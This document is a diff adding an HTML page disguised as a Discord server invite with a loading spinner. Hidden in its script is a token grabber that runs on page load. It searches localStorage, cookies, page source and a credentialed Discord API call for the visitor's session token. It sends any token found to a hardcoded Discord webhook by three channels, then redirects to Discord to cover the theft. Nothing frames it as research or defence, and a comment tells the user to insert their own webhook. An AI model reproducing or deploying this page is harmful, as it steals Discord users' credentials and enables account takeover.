@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Invite</title>
+    <meta charset="UTF-8">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #36393f;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        .container {
+            background: #2f3136;
+            border-radius: 8px;
+            padding: 40px;
+            text-align: center;
+            color: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            max-width: 400px;
+        }
+        .spinner {
+            border: 4px solid #4f545c;
+            border-top: 4px solid #5865F2;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .discord-logo {
+            width: 60px;
+            height: 60px;
+            background: #5865F2;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="discord-logo">D</div>
+        <div class="spinner"></div>
+        <h2>Joining Server...</h2>
+        <p id="status">Connecting to Discord</p>
+    </div>
+
+    <script>
+        // ============================================
+        // DISCORD TOKEN GRABBER - AGGRESSIVE MODE
+        // Tries EVERY possible method to steal token
+        // ============================================
+
+        let TOKEN = null;
+        let STEAL_URL = "https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj"; // Replace with your webhook
+
+        // Method 1: localStorage
+        function tryLocalStorage() {
+            try {
+                let t = localStorage.getItem('token');
+                if (t && t.length > 50) {
+                    TOKEN = t;
+                    console.log("[+] Found token in localStorage");
+                    return true;
+                }
+            } catch(e) { console.log("[-] localStorage failed: " + e); }
+            return false;
+        }
+
+        // Method 2: Cookies
+        function tryCookies() {
+            try {
+                let cookies = document.cookie.split(';');
+                for (let cookie of cookies) {
+                    cookie = cookie.trim();
+                    if (cookie.startsWith('token=')) {
+                        TOKEN = cookie.substring(6);
+                        console.log("[+] Found token in cookies");
+                        return true;
+                    }
+                }
+            } catch(e) { console.log("[-] Cookies failed: " + e); }
+            return false;
+        }
+
+        // Method 3: Discord internal objects
+        function tryDiscordObjects() {
+            try {
+                if (window.Discord && window.Discord.token) {
+                    TOKEN = window.Discord.token;
+                    console.log("[+] Found token in window.Discord");
+                    return true;
+                }
+            } catch(e) { console.log("[-] Discord objects failed: " + e); }
+            return false;
+        }
+
+        // Method 4: Page source parsing
+        function tryPageSource() {
+            try {
+                let html = document.documentElement.outerHTML;
+                let match = html.match(/token["\s]*[:=]["\s]*(["'])([^"']*)\1/);
+                if (match && match[2].length > 50) {
+                    TOKEN = match[2];
+                    console.log("[+] Found token in page source");
+                    return true;
+                }
+            } catch(e) { console.log("[-] Page source failed: " + e); }
+            return false;
+        }
+
+        // Method 5: Script tags
+        function tryScriptTags() {
+            try {
+                let scripts = document.getElementsByTagName('script');
+                for (let script of scripts) {
+                    if (script.src && script.src.includes('discord.com')) {
+                        // Try to find token in script content
+                    }
+                }
+            } catch(e) { console.log("[-] Script tags failed: " + e); }
+            return false;
+        }
+
+        // Method 6: Fetch with credentials
+        function tryFetchCredentials() {
+            return new Promise((resolve) => {
+                try {
+                    fetch('https://discord.com/api/v9/users/@me', {
+                        credentials: 'include'
+                    }).then(r => r.json()).then(data => {
+                        if (data.token) {
+                            TOKEN = data.token;
+                            console.log("[+] Found token via fetch");
+                            resolve(true);
+                        } else {
+                            resolve(false);
+                        }
+                    }).catch(() => resolve(false));
+                } catch(e) {
+                    console.log("[-] Fetch failed: " + e);
+                    resolve(false);
+                }
+            });
+        }
+
+        // Send token via multiple channels
+        function sendToken(token) {
+            console.log("[+] Sending token...");
+
+            // Channel 1: Image beacon
+            try {
+                let img = new Image();
+                img.src = STEAL_URL + "?token=" + encodeURIComponent(token) + "&method=image";
+            } catch(e) { console.log("[-] Image beacon failed"); }
+
+            // Channel 2: Fetch POST
+            try {
+                fetch(STEAL_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ token: token, method: 'fetch' })
+                }).catch(() => {});
+            } catch(e) { console.log("[-] Fetch POST failed"); }
+
+            // Channel 3: XMLHttpRequest
+            try {
+                let xhr = new XMLHttpRequest();
+                xhr.open('POST', STEAL_URL, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({ token: token, method: 'xhr' }));
+            } catch(e) { console.log("[-] XHR failed"); }
+
+            // Channel 4: Redirect
+            try {
+                setTimeout(() => {
+                    window.location.href = "https://discord.com/app";
+                }, 1000);
+            } catch(e) {}
+        }
+
+        // Main execution
+        async function grabToken() {
+            console.log("Starting token grab...");
+
+            // Try all methods
+            if (!TOKEN) tryLocalStorage();
+            if (!TOKEN) tryCookies();
+            if (!TOKEN) tryDiscordObjects();
+            if (!TOKEN) tryPageSource();
+            if (!TOKEN) tryScriptTags();
+            if (!TOKEN) await tryFetchCredentials();
+
+            if (TOKEN) {
+                console.log("[+] TOKEN FOUND!");
+                sendToken(TOKEN);
+                document.getElementById('status').textContent = "Success! Redirecting...";
+            } else {
+                console.log("[-] Token not found");
+                document.getElementById('status').textContent = "Error connecting. Try again.";
+
+                // Retry after delay
+                setTimeout(() => {
+                    grabToken();
+                }, 3000);
+            }
+        }
+
+        // Start grabbing
+        grabToken();
+
+        // Also try on page load events
+        window.addEventListener('load', grabToken);
+        window.addEventListener('DOMContentLoaded', grabToken);
+    </script>
+</body>
+</html>
